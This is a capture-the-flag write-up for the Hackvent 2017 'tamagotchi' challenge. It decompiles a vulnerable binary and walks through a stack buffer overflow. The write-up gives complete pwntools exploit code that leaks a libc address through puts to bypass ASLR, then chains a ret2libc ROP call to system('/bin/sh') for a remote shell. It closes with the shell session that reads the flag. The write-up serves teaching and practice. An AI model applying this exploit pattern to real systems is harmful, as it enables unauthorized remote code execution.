# Day 21: tamagotchi
  
*ohai fuud or gtfo*

**ohai**

I'm a little tamagotchi who wants fuuuuud, pls don't giveh me too much or I'll crash...

`nc challenges.hackvent.hacking-lab.com 31337`

[File #1: tamagotchi](files/tamagotchi "tamagotchi") + [File #2: libc-2.26.so](files/libc-2.26.so "libc-2.26.so")

### Solution

"*pls don't giveh me too much or I'll crash...*" - hmm, sounds like buffer overflow vulnerability. 

```bash
$ file tamagotchi libc-2.26.so 
tamagotchi:   ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bc180fb6cf42f3134c8b07c42c35f1efdbd88cc2, not stripped
libc-2.26.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6d2b609f0c8e7b338f767b08c5ac712fac809d31, for GNU/Linux 3.2.0, stripped
```

I tried to decompile it in IDA.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char s; // [rsp+0h] [rbp-4D0h]
  char v5; // [rsp+400h] [rbp-D0h]
  int v6; // [rsp+4C8h] [rbp-8h]
  int v7; // [rsp+4CCh] [rbp-4h]

  v7 = 1;
  v6 = 0;
  show_title(*(_QWORD *)&argc, argv, envp);
  result = show_menu();
  while ( v7 )
  {
    puts("[ch01c3]> ");
    fgets(&s, 1024, _bss_start);
    v6 = atoi(&s);
    if ( v6 == 1 )
    {
      puts("[f00d]> ");
      fgets(&v5, 1024, _bss_start);
      result = puts("[+] nom nom nom ");
    }
    else if ( v6 == 2 )
    {
      result = puts("[+] bye bye");
      v7 = 0;
    }
    else
    {
      result = puts("[-] nope!");
    }
  }
  return result;
}
```

Those `fgets` calls looked promising so the next step was to find offset to overflow the buffer and overwrite RIP using `gdb`. Offset of 216 did the job.

Then I employed [`ropper`](https://github.com/sashs/ropper) to find a suitable ROP injection point.

```bash
ropper --file tamagotchi --search "% ?di"
0x0000000000400695: call 0x4b0; mov edi, 0x4008b7; call 0x4b0; pop rbp; ret;
0x00000000004006b9: call 0x4b0; mov edi, 0x400a5b; call 0x4b0; pop rbp; ret;
0x000000000040069a: mov edi, 0x4008b7; call 0x4b0; pop rbp; ret;
0x00000000004006be: mov edi, 0x400a5b; call 0x4b0; pop rbp; ret;
0x0000000000400550: mov edi, 0x601048; jmp rax;
0x00000000004006b6: or al, byte ptr [rax]; call 0x4b0; mov edi, 0x400a5b; call 0x4b0; pop rbp; ret;
0x0000000000400692: or dword ptr [rax], eax; call 0x4b0; mov edi, 0x4008b7; call 0x4b0; pop rbp; ret;
0x000000000040054f: pop rbp; mov edi, 0x601048; jmp rax;
0x0000000000400803: pop rdi; ret;
```

The last one at `0x400803` was perfect.

We can take advantage of given copy of `libc.so`, but since ASLR is enabled on the remote server we need to leak address of the library in memory first. To do that we need pass pointer to `puts` method to the `puts` call so the address gets printed. Then we can calculate all needed remote addresses from known offsets obtained by static analysis of provided `libc` library.

```python
from pwn import *
from struct import *

r = remote("challenges.hackvent.hacking-lab.com", 31337)

rip_offset = 216                                # offset to RIP
rop = 0x400803                                  # pop rdi; ret;
puts_plt = 0x4004b0                             # puts@plt
main = 0x4006ca                                 # address of main() so we can jump back to the choice after getting the libc address

puts_got = 0x601018                             # puts() GOT                    - objdump -R tamagotchi | grep puts
puts_off = 0x078460                             # offset to puts() function     - readelf -s libc-2.26.so | grep puts
system_off = 0x47dc0                            # system offset in libc         - readelf -s libc-2.26.so | grep system
bin_sh_off  = 0x1a3ee0                          # shell offset in /bin/sh       - objdump -s libc-2.26.so | grep /bin/sh

# buffer to leak remote puts() address
buf_leak = "A"*rip_offset
buf_leak += pack("<Q", rop)
buf_leak += pack("<Q", puts_got)
buf_leak += pack("<Q", puts_plt)
buf_leak += pack("<Q", main)

# stage 1: read the remote puts() address
print r.recvuntil("[ch01c3]>")
r.sendline("1")
print r.recvuntil("[f00d]>")
r.sendline(buf_leak)
print r.recvuntil("[ch01c3]>")
r.sendline("2")
print r.recvuntil("[+] bye bye\n")

# calculate remote addresses from known offsets
puts_got_val = u64(r.recv(6) + "\x00"*2)
libc_base = puts_got_val - puts_off
system = libc_base + system_off
bin_sh = libc_base + bin_sh_off

print "[+] libc base at: 0x%08x" % libc_base
print "[+] system() at: 0x%08x" % system
print "[+] /bin/sh at: 0x%08x" % bin_sh
```

It worked like a charm! Now it was time to do the second buffer overflow to get RCE and remote shell access. I used the same ROP injection point to call `system()` with address of `/bin/sh` as its argument and then switched to interactive mode to be able to execute commands.

```python
# buffer to get remote command execution
buf_rce = "A"*rip_offset
buf_rce += pack("<Q", rop)
buf_rce += pack("<Q", bin_sh)
buf_rce += pack("<Q", system)

# stage 2: pwn
print r.recvuntil("[ch01c3]>")
r.sendline("1")
print r.recvuntil("[f00d]>")
r.sendline(buf_rce)
print r.recvuntil("[ch01c3]>")
r.sendline("2")
print r.recvuntil("[+] bye bye\n")

r.interactive()
```

The complete source code of this remote exploit can be found [here](../../src/main/python/hackvent2017/Day21.py).

Once I got the remote shell it was pretty straightforward.

```bash
$ $ ls /home
tamagotchi
$ cd /home/tamagotchi
$ ls
flag  tamagotchi
$ cat flag
HV17-pwn3d-t4m4g0tch3y-thr0ugh-f00d
```

The result flag:

```
HV17-pwn3d-t4m4g0tch3y-thr0ugh-f00d
```